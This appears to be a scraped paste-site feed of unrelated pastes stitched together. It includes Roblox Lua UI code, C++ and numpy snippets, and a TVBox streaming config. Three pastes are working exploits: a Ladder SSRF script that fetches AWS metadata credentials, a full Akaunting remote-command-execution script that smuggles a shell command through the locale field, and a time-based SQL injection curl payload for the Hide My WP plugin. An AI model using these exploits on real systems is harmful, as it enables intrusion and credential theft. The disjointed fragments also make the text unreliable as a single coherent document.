					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""187thSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to show ARCSelectMorph frame when 501stDiv button is clicked
local function ShowARCSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""ARCDiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""ARCSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to show ARCSelectMorph frame when 501stDiv button is clicked
local function ShowRCSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""RCDiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""RCSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to show ARCSelectMorph frame when 501stDiv button is clicked
local function ShowCGSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""CGDiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""CGSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to show ARCSelectMorph frame when 501stDiv button is clicked
local function ShowRGSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""RGDiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""RGSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to show ARCSelectMorph frame when 501stDiv button is clicked
local function ShowTJOSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""TJODiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""TJOSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to hide all morph frames
local function HideAllMorphFrames()
	for name, visible in pairs(morphFrames) do
		local frame = ArmorFrame:FindFirstChild(name)
		if frame then
			frame.Visible = false
		end
	end
end

-- Function to show a specific morph frame
local function ShowMorphFrame(frameName)
	HideAllMorphFrames()
	local frame = ArmorFrame:FindFirstChild(frameName)
	if frame then
		frame.Visible = true
	end
end

-- Connect click events for category buttons
CharacterButton.MouseButton1Click:Connect(function()
	ShowUIFrame(CharacterFrame)
	SetButtonStyle(CharacterButton)
	CategoriesFrame.Visible = true
	ToggleCustomizedMorphViewportFrameVisibility(true) -- Show ViewportFrame
end)

ArmorButton.MouseButton1Click:Connect(function()
	ShowUIFrame(ArmorFrame)
	SetButtonStyle(ArmorButton)
	CategoriesFrame.Visible = true
	ToggleCustomizedMorphViewportFrameVisibility(false) -- Hide ViewportFrame
end)

LoadoutButton.MouseButton1Click:Connect(function()
	ShowUIFrame(LoadoutFrame)
	SetButtonStyle(LoadoutButton)
	CategoriesFrame.Visible = true
	ToggleCustomizedMorphViewportFrameVisibility(false) -- Hide ViewportFrame
end)

-- Function to connect click events for divisional buttons
local function ConnectDivisionButtonClick(divisionName, frameName)
	local divisionFrame = ArmorFrame:FindFirstChild(""DivisionSelector""):FindFirstChild(""ScrollingFrame""):FindFirstChild(divisionName)
	if divisionFrame then
		local button = divisionFrame:FindFirstChild(""TextButton"")
		if button then
			button.MouseButton1Click:Connect(function()
				ShowMorphFrame(frameName)
			end)
		else
			warn(""TextButton not found in division frame "" .. divisionName)
		end
	else
		warn(""Division frame "" .. divisionName .. "" not found"")
	end
end

-- Connect click events for divisional buttons
ConnectDivisionButtonClick(""501stDiv"", ""501stSelectMorph"")
ConnectDivisionButtonClick(""GalacticRepublicDiv"", ""TGRSelectMorph"")
ConnectDivisionButtonClick(""212thDiv"", ""212thSelectMorph"")
ConnectDivisionButtonClick(""187thDiv"", ""187thSelectMorph"")
ConnectDivisionButtonClick(""ARCDiv"", ""ARCSelectMorph"")
ConnectDivisionButtonClick(""RCDiv"", ""RCSelectMorph"")
ConnectDivisionButtonClick(""CGDiv"", ""CGSelectMorph"")
ConnectDivisionButtonClick(""RGDiv"", ""RGSelectMorph"")
ConnectDivisionButtonClick(""TJODiv"", ""TJOSelectMorph"")


-- Initially set the text color and transparency for the character button
SetButtonStyle(CharacterButton)"
s85Gu5m1,Untitled,ShRooK_MoHameD,C++,Monday 11th of March 2024 01:45:17 AM CDT,"void solve(){
 
   ll n ; cin >> n;
   vector < ll > v(n); cin(v);
   sort(all(v));
 
 
    ll sum = sm(v) , diff = abs ((sum - v.back()) - v.back());
     
 
    if(sum - v.back() < v.back()) cout << sum + diff ;
    else cout << sum ;
   
   
}"
LcmmA4jG,Mad,Unknown_No_1,PHP,Monday 11th of March 2024 12:26:50 AM CDT,RAMZANxSPECIALxKEY
97rmAx5N,Ladder v0.0.21 - Server-side request forgery (SSRF) - CVE-2024-27620,FlyFar,Python,Sunday 10th of March 2024 11:45:32 PM CDT,"# Exploit Title: Ladder v0.0.21 - Server-side request forgery (SSRF)
# Date: 2024-01-20
# Exploit Author: @_chebuya
# Software Link: https://github.com/everywall/ladder
# Version: v0.0.1 - v0.0.21
# Tested on: Ubuntu 20.04.6 LTS on AWS EC2 (ami-0fd63e471b04e22d0)
# CVE: CVE-2024-27620
# Description: Ladder fails to apply sufficient default restrictions on destination addresses, allowing an attacker to make GET requests to addresses that would typically not be accessible from an external context.  An attacker can access private address ranges, locally listening services, and cloud instance metadata APIs

import requests
import json

target_url = ""http://127.0.0.1:8080/api/""
imdsv1_url = ""http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance""

r = requests.get(target_url + imdsv1_url)
response_json = json.loads(r.text)
print(response_json[""body""])
            "
DapB19nB,Akaunting < 3.1.3 - RCE - CVE-2024-22836,FlyFar,Python,Sunday 10th of March 2024 11:44:40 PM CDT,"# Exploit Title: Akaunting < 3.1.3 - RCE
# Date: 08/02/2024
# Exploit Author: u32i@proton.me
# Vendor Homepage: https://akaunting.com
# Software Link: https://github.com/akaunting/akaunting
# Version: <= 3.1.3
# Tested on: Ubuntu (22.04)
# CVE : CVE-2024-22836

#!/usr/bin/python3

import sys
import re
import requests
import argparse

def get_company():
	# print(""[INF] Retrieving company id..."")
	res = requests.get(target, headers=headers, cookies=cookies, allow_redirects=False)
	if res.status_code != 302:
		print(""[ERR] No company id was found!"")
		sys.exit(3)
	cid = res.headers['Location'].split('/')[-1]
	if cid == ""login"":
		print(""[ERR] Invalid session cookie!"")
		sys.exit(7)
	return cid

def get_tokens(url):
	res = requests.get(url, headers=headers, cookies=cookies, allow_redirects=False)
	search_res = re.search(r""\""csrfToken\""\:\"".*\"""", res.text)

	if not search_res:
		print(""[ERR] Couldn't get csrf token"")
		sys.exit(1)

	data = {}
	data['csrf_token'] = search_res.group().split(':')[-1:][0].replace('""', '')
	data['session'] = res.cookies.get('akaunting_session')
	return data

def inject_command(cmd):
	url = f""{target}/{company_id}/wizard/companies""
	tokens = get_tokens(url)
	headers.update({""X-Csrf-Token"": tokens['csrf_token']})
	data = {""_token"": tokens['csrf_token'], ""_method"": ""POST"", ""_prefix"": ""company"", ""locale"": f""en_US && {cmd}""}
	res = requests.post(url, headers=headers, cookies=cookies, json=data, allow_redirects=False)
	if res.status_code == 200:
		res_data = res.json()
		if res_data['error']:
			print(""[ERR] Command injection failed!"")
			sys.exit(4)
		print(""[INF] Command injected!"")


def trigger_rce(app, version = ""1.0.0""):
	print(""[INF] Executing the command..."")
	url = f""{target}/{company_id}/apps/install""
	data = {""alias"": app, ""version"": version, ""path"": f""apps/{app}/download""}
	headers.update({""Content-Type"":""application/json""})
	res = requests.post(url, headers=headers, cookies=cookies, json=data, allow_redirects=False)
	if res.status_code == 200:
		res_data = res.json()
		if res_data['error']:
			search_res = re.search(r"">Exit Code\:.*<"", res_data['message'])
			if search_res:
				print(""[ERR] Failed to execute the command"")
				sys.exit(6)
			print(""[ERR] Failed to install the app! no command was executed!"")
			sys.exit(5)
		print(""[INF] Executed successfully!"")

def login(email, password):
	url = f""{target}/auth/login""
	tokens = get_tokens(url)

	cookies.update({
		'akaunting_session': tokens['session']
	})

	data = {
		""_token"": tokens['csrf_token'],
		""_method"": ""POST"",
		""email"": email,
		""password"": password
	}
	
	req = requests.post(url, headers=headers, cookies=cookies, data=data)
	res = req.json()
	if res['error']:
		print(""[ERR] Failed to log in!"")
		sys.exit(8)

	print(""[INF] Logged in"")
	cookies.update({'akaunting_session': req.cookies.get('akaunting_session')})
		
def main():
	inject_command(args.command)
	trigger_rce(args.alias, args.version)

if __name__=='__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument(""-u"", ""--url"", help=""target url"")
	parser.add_argument(""--email"", help=""user login email."")
	parser.add_argument(""--password"", help=""user login password."")
	parser.add_argument(""-i"", ""--id"", type=int, help=""company id (optional)."")
	parser.add_argument(""-c"", ""--command"", help=""command to execute."")
	parser.add_argument(""-a"", ""--alias"", help=""app alias, default: paypal-standard"", default=""paypal-standard"")
	parser.add_argument(""-av"", ""--version"", help=""app version, default: 3.0.2"", default=""3.0.2"")

	args = parser.parse_args()
	
	headers = {""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36""}
	cookies = {}
	target = args.url

	try:
		login(args.email, args.password)
		company_id = get_company() if not args.id else args.id
		main()
	except:
		sys.exit(0)
            "
8XW8KM9z,Hide My WP < 6.2.9 - Unauthenticated SQLi - CVE-2022-4681,FlyFar,Email,Sunday 10th of March 2024 11:43:49 PM CDT,"# Exploit Title: Wordpress Plugin Hide My WP < 6.2.9 - Unauthenticated SQLi 
# Publication Date: 2023-01-11
# Original Researcher: Xenofon Vassilakopoulos
# Exploit Author: Xenofon Vassilakopoulos
# Submitter: Xenofon Vassilakopoulos
# Vendor Homepage: https://wpwave.com/
# Version: Hide My WP v6.2.8 and prior
# Tested on: Hide My WP v6.2.7
# Impact: Database Access
# CVE: CVE-2022-4681
# CWE: CWE-89
# CVSS Score: 8.6 (high)

## Description

The plugin does not properly sanitize and escape a parameter before using it in a SQL statement via an AJAX action available to unauthenticated users, leading to a SQL injection.


## Proof of Concept

curl -k --location --request GET ""http://localhost:10008"" --header ""X-Forwarded-For: 127.0.0.1'+(select*from(select(sleep(20)))a)+'""
            "
iyf1tCzp,numpy lab(11/03/2024),brandblox,Python,Sunday 10th of March 2024 11:29:17 PM CDT,"# -*- coding: utf-8 -*-
""""""
Created on Mon Mar 11 09:30:09 2024

@author: lab
""""""

import numpy as np
import pandas as pd
import seaborn as sns
# Example dataset
diamonds = sns.load_dataset(""diamonds"")
diamond_prices = diamonds[""price""]
mean_price = diamond_prices.mean()
median_price = diamond_prices.median()
std = diamond_prices.std()
skewness = (3 * (mean_price - median_price)) / std
print(f""The Pierson's second skewness score of diamond prices distribution is {skewness:.5f}"")
#The Pierson's second skewness score of diamond prices distribution is 1.15189
def moment_based_skew(distribution):
 n = len(distribution)
 mean = np.mean(distribution)
 std = np.std(distribution)

 # Divide the formula into two parts
 first_part = n / ((n - 1) * (n - 2))
 second_part = np.sum(((distribution - mean) / std) ** 3)

 skewness = first_part * second_part
 return skewness
skew = moment_based_skew(diamond_prices)
print(""The moment_based skewness score of diamond prices distribution is "", skew)
# Using Libraries
# Pandas version
print(""The moment_based skewness skewness score of diamond prices distribution is "",
diamond_prices.skew())
# SciPy version
from scipy.stats import skew
print(""The moment_based skewness skewness score of diamond prices distribution is "",
skew(diamond_prices))
# Visualization
import matplotlib.pyplot as plt
sns.kdeplot(diamond_prices)
plt.title(""Plot of diamond prices"")
plt.xlabel(""Price ($)"")"
MekTb7GX,Untitled,nathaditya,C++,Sunday 10th of March 2024 11:03:16 PM CDT,"Node* constructLinkedMatrix(int mat[MAX][MAX], int n)
{
    struct Node* head;
    struct Node* temp;
    
    vector<Node*> vec;
    for(int i = 0; i < n; i++){
        for(int j = 0; j < n; j++){
            Node* newNode = new Node(mat[i][j]);
            if(j == 0){
                temp = newNode;
                vec.push_back(temp);
            }
            else{
                temp->right = newNode;
                temp = newNode;
            }
        }
    }
    
    head = vec[0];
    for(int i = 0; i < n; i++){
        for(int j = 0; j < n-1; j++){
            vec[j]->down = vec[j+1];
            vec[j] = vec[j]->right;
        }
        vec[n-1] = vec[n-1]->right;
    }
    return head;
}
"
abSyUuKc,jyzx,nanzhao2018,JSON,Sunday 10th of March 2024 10:53:56 PM CDT,"{
    ""wallpaper"": ""https://www.dmoe.cc/random.php"",
    ""spider"": ""https://agit.ai/895322156/Q/raw/branch/master/jar/xjy.jar;md5;e5f048383b35728c4f1bb21c708c0c7"",
    ""lives"": [
        {
          ""name"": ""直播"",
          ""type"": 0,
          ""playerType"": 1,
          ""url"": ""https://agit.ai/Yoursmile7/TVBox/raw/branch/master/live.txt"",
          ""epg"": ""http://epg.51zmt.top:8000/api/diyp/?ch={name}&date={date}"",
          //""epg"": ""https://epg.112114.xyz/?ch={name}&date={date}"",     
          ""logo"": ""http://epg.51zmt.top:8000/api/diyp/logo/{name}.png""
          //""logo"": ""https://epg.112114.xyz/logo/{name}.png""
        },
        {
            ""group"": ""redirect"",
            ""channels"": [
                {
                    ""name"": ""live"",
                    ""epg"": ""http://epg.51zmt.top:8000/api/diyp/?ch={name}&date={date}"",
                    //""urls"": [""proxy://do=live&type=txt&ext=aHR0cDovLzl4aTRvLnRrL09uZUNsaWNrUnVuL2xpdmUudHh0""]
                    ""urls"": [""proxy://do=live&type=txt&ext=https://agit.ai/Yoursmile7/TVBox/raw/branch/master/live.txt""]
                    //""urls"": [""proxy://do=live&type=txt&ext=http://dlq.gmqd.com/upload/20220921115985878587.txt""]
                    //""urls"": [""proxy://do=live&type=txt&ext=http://home.jundie.top:81/ray/tvlive.txt""]
                }
            ]
        }
    ],
    ""sites"": [
   {
            ""key"": ""知识"",
            ""name"": ""🌏知识┃学堂"",
            ""type"": 3,
            ""api"": ""csp_Bili"",
            ""searchable"": 0,
            ""quickSearch"": 0,
            ""filterable"": 0,
""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/知识.json"", ""jar"":""""
                   },
        {
            ""key"": ""儿童"",
            ""name"": ""🌏少儿┃教育"",
            ""type"": 3,
            ""api"": ""csp_Bili"",
            ""searchable"": 0,
            ""quickSearch"": 0,
            ""filterable"": 0,
""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/少儿.json"", ""jar"":""""
                    },
        {
            ""key"": ""小学"",
            ""name"": ""🌏小学┃课堂"",
            ""type"": 3,
            ""api"": ""csp_Bili"",
            ""searchable"": 0,
            ""quickSearch"": 0,
            ""filterable"": 0,
""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小学.json"", ""jar"":""""
                    },
        {
            ""key"": ""初中"",
            ""name"": ""🌏初中┃课堂"",
            ""type"": 3,
            ""api"": ""csp_Bili"",
            ""searchable"": 0,
            ""quickSearch"": 0,
            ""filterable"": 0,
""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/初中.json"", ""jar"":""""
                   },
        {
            ""key"": ""高中"",
            ""name"": ""🌏高中┃课堂"",
            ""type"": 3,
            ""api"": ""csp_Bili"",
            ""searchable"": 0,
            ""quickSearch"": 0,
            ""filterable"": 0,
""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/高中.json"", ""jar"":""""
                    },
{""key"":""幼小衔接"",""name"":""🌏幼小衔接"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/幼小衔接.json"",""jar"": """"},
		{""key"":""幼儿启蒙"",""name"":""🌏幼儿启蒙"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/幼儿启蒙.json"",""jar"": """"},
		{""key"":""csp_hiker_兔小贝"",""name"":""🌏兔小贝"",""type"":3,""api"":""csp_XYQHiker"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/兔小贝.json"",""jar"": """"},
		{""key"":""csp_hiker_兔小贝2"",""name"":""🌏兔小贝2"",""type"":3,""api"":""csp_XYQHiker"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/兔小贝2.json"",""jar"": """"},
		
		{""key"":""小灯塔"",""name"":""🌏小灯塔"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小灯塔百科.json""
,""jar"": """"},
		{""key"":""小灯塔科学"",""name"":""🌏小灯塔科学"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小灯塔科学.json"",""jar"": """"},
		{""key"":""小灯塔地理"",""name"":""🌏小灯塔地理"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小灯塔地理.json"",""jar"": """"},
		{""key"":""小灯塔国学"",""name"":""🌏小灯塔国学"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小灯塔国学.json"",""jar"": """"},
		{""key"":""小灯塔人文"",""name"":""🌏小灯塔人文"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小灯塔人文.json"",""jar"": """"},
		
		{""key"":""儿童拼音"",""name"":""🌏儿童拼音"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/儿童拼音.json"",""jar"": """"},
		{""key"":""儿童识字"",""name"":""🌏儿童识字"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/儿童识字.json"",""jar"": """"},
		{""key"":""儿童英语"",""name"":""🌏儿童英语"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/儿童英语.json"",""jar"": """"},
		{""key"":""儿童硬笔"",""name"":""🌏儿童硬笔"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/儿童硬笔.json"",""jar"": """"},
		{""key"":""儿童思维"",""name"":""🌏儿童思维"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/儿童思维.json"",""jar"": """"},
		{""key"":""儿童口才"",""name"":""🌏儿童口才"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/儿童口才.json"",""jar"": """"},
		{""key"":""儿童编程"",""name"":""🌏儿童编程"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/儿童编程.json"",""jar"": """"},
		{""key"":""儿童武术"",""name"":""🌏儿童武术"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/儿童武术.json"",""jar"": """"},
		
		{""key"":""兴趣培养"",""name"":""🌏兴趣培养"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/兴趣培养.json"",""jar"": """"},
		{""key"":""央视经典"",""name"":""🌏央视经典"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/央视经典.json"",""jar"": """"},
		{""key"":""益智动画"",""name"":""🌏益智动画"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/益智动画.json"",""jar"": """"},
		{""key"":""小学语文"",""name"":""🌏小学语文"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小学语文.json"",""jar"": """"},
		{""key"":""小学数学"",""name"":""🌏小学数学"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小学数学.json"",""jar"": """"},
		{""key"":""小学英语"",""name"":""🌏小学英语"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小学英语.json"",""jar"": """"},
		{""key"":""小学教育"",""name"":""🌏小学教育"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小学教育.json"",""jar"": """"}     
        
    ],
    ""parses"": [
        //{""name"":""解析聚合"",""type"":3,""url"":""Demo""},
        //{""name"":""Json并发"",""type"":2,""url"":""Parallel""},
        //{""name"":""Json轮询"",""type"":2,""url"":""Sequence""},
        {""name"":""1"",""type"":0,""url"":""https://jx.m3u8.pw/?url=""},
        {""name"":""2"",""type"":0,""url"":""https://jx.xmflv.com/?url=""},
        {""name"":""3"",""type"":0,""url"":""https://jx.bozrc.com:4433/player/?url="",""ext"":{""flag"":[""qq"",""腾讯"",""qiyi"",""爱奇艺"",""奇艺"",""youku"",""优酷"",""mgtv"",""芒果"",""letv"",""乐视"",""pptv"",""PPTV"",""sohu"",""bilibili"",""哔哩哔哩"",""哔哩""]}},
        {""name"":""4"",""type"":0,""url"":""http://okjx.cc/?url="",""parse"":""1"",""ext"":{""flag"":[""qq"",""腾讯"",""qiyi"",""爱奇艺"",""奇艺"",""youku"",""优酷"",""mgtv"",""芒果"",""letv"",""乐视"",""pptv"",""PPTV"",""sohu"",""bilibili"",""哔哩哔哩"",""哔哩""]}},
        {""name"":""5"",""type"":0,""url"":""https://jx.yparse.com/index.php?url=""},
        {""name"":""6"",""type"":0,""url"":""https://jx.jsonplayer.com/player/?url=""},
        {""name"":""7"",""type"":0,""url"":""https://jx.aidouer.net/?url=""},
        {""name"":""8"",""type"":0,""url"":""https://jx.quankan.app/?url=""}
        
    ],
    ""flags"": [
        ""youku"",
        ""qq"",
        ""iqiyi"",
        ""qiyi"",
        ""letv"",
        ""sohu"",
        ""tudou"",
        ""pptv"",
        ""mgtv"",
        ""wasu"",
        ""bilibili"",
        ""renrenmi""
    ],
    ""rules"":[
        {
        ""host"":""www.iesdouyin.com"",
        ""rule"":[""playwm/?video_id=""]
        },
        {
        ""host"":""v.douyin.com"",
        ""rule"":[""playwm/?video_id=""]
        }
    ],
    ""ijk"": [
        {
            ""group"": ""软解码"",
            ""options"": [
                {
                    ""category"": 4,
                    ""name"": ""opensles"",
                    ""value"": ""0""
                },
                {
                    ""category"": 4,
                    ""name"": ""overlay-format"",
                    ""value"": ""842225234""
                },
                {
                    ""category"": 4,
                    ""name"": ""framedrop"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""soundtouch"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""start-on-prepared"",
                    ""value"": ""1""
                },
                {
                    ""category"": 1,
                    ""name"": ""http-detect-range-support"",
                    ""value"": ""0""
                },
                {
                    ""category"": 1,
                    ""name"": ""fflags"",
                    ""value"": ""fastseek""
                },
                {
                    ""category"": 2,
                    ""name"": ""skip_loop_filter"",
                    ""value"": ""48""
                },
                {
                    ""category"": 4,
                    ""name"": ""reconnect"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""enable-accurate-seek"",
                    ""value"": ""0""
                },
                {
                    ""category"": 4,
                    ""name"": ""mediacodec"",
                    ""value"": ""0""
                },
                {
                    ""category"": 4,
                    ""name"": ""mediacodec-auto-rotate"",
                    ""value"": ""0""
                },
                {
                    ""category"": 4,
                    ""name"": ""mediacodec-handle-resolution-change"",
                    ""value"": ""0""
                },
                {
                    ""category"": 4,
                    ""name"": ""mediacodec-hevc"",
                    ""value"": ""0""
                },
                {
                    ""category"": 1,
                    ""name"": ""dns_cache_timeout"",
                    ""value"": ""600000000""
                }
            ]
        },
        {
            ""group"": ""硬解码"",
            ""options"": [
                {
                    ""category"": 4,
                    ""name"": ""opensles"",
                    ""value"": ""0""
                },
                {
                    ""category"": 4,
                    ""name"": ""overlay-format"",
                    ""value"": ""842225234""
                },
                {
                    ""category"": 4,
                    ""name"": ""framedrop"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""soundtouch"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""start-on-prepared"",
                    ""value"": ""1""
                },
                {
                    ""category"": 1,
                    ""name"": ""http-detect-range-support"",
                    ""value"": ""0""
                },
                {
                    ""category"": 1,
                    ""name"": ""fflags"",
                    ""value"": ""fastseek""
                },
                {
                    ""category"": 2,
                    ""name"": ""skip_loop_filter"",
                    ""value"": ""48""
                },
                {
                    ""category"": 4,
                    ""name"": ""reconnect"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""enable-accurate-seek"",
                    ""value"": ""0""
                },
                {
                    ""category"": 4,
                    ""name"": ""mediacodec"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""mediacodec-auto-rotate"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""mediacodec-handle-resolution-change"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""mediacodec-hevc"",
                    ""value"": ""1""
                },
                {
                    ""category"": 1,
                    ""name"": ""dns_cache_timeout"",
                    ""value"": ""600000000""
                }
            ]
        }
    ],
    ""ads"": [
        ""mimg.0c1q0l.cn"",
        ""www.googletagmanager.com"",
        ""www.google-analytics.com"",
        ""mc.usihnbcq.cn"",
        ""mg.g1mm3d.cn"",
        ""mscs.svaeuzh.cn"",
        ""cnzz.hhttm.top"",
        ""tp.vinuxhome.com"",
        ""cnzz.mmstat.com"",
        ""www.baihuillq.com"",
        ""s23.cnzz.com"",
        ""z3.cnzz.com"",
        ""c.cnzz.com"",
        ""stj.v1vo.top"",
        ""z12.cnzz.com"",
        ""img.mosflower.cn"",
        ""tips.gamevvip.com"",
        ""ehwe.yhdtns.com"",
        ""xdn.cqqc3.com"",
        ""www.jixunkyy.cn"",
        ""sp.chemacid.cn"",
        ""hm.baidu.com"",
        ""s9.cnzz.com"",
        ""z6.cnzz.com"",
        ""um.cavuc.com"",
        ""mav.mavuz.com"",
        ""wofwk.aoidf3.com"",
        ""z5.cnzz.com"",
        ""xc.hubeijieshikj.cn"",
        ""tj.tianwenhu.com"",
        ""xg.gars57.cn"",
        ""k.jinxiuzhilv.com"",
        ""cdn.bootcss.com"",
        ""ppl.xunzhuo123.com"",
        ""xomk.jiangjunmh.top"",
        ""img.xunzhuo123.com"",
        ""z1.cnzz.com"",
        ""s13.cnzz.com"",
        ""xg.huataisangao.cn"",
        ""z7.cnzz.com"",
